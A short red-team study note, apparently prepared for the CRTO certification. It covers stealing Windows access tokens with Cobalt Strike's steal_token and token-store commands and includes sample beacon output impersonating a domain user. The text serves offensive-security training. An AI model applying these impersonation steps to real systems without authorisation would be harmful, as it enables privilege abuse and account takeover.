Processes have [[Access Token]]s associated to them that you can steal.

You can do this technique via [[Pass the Ticket]] by obtaining tickets first and then stealing the token from the injected process. 

If you don't have tickets, but you are running on a elevated session, search for processes being run by other users, pick one and run:

`	steal_token [PID of process to steal token from] `

Now you'll be running things as that user.

##  📗 Token Store 

Allows to steal, store, and re-use tokens you have stolen during your engagement. We can use it like this:

1) steal and store the token

```
beacon> token-store steal 5536
[*] Stored Tokens

 ID   PID   User
 --   ---   ----
 0    5536  DEV\jking
```

2) use a stored token

```
beacon> token-store use 0
[+] Impersonated DEV\jking
```

Other commands:

```
token-store show : list all tokens
token-store remove [id] : remove a token
token-store remove-all : remove all tokens
```

The store works per beacon and can't be transferred.




### Properties
---
📆 created   {{14-02-2024}} 09:50
🏷️ tags: #redteam #crto 

---

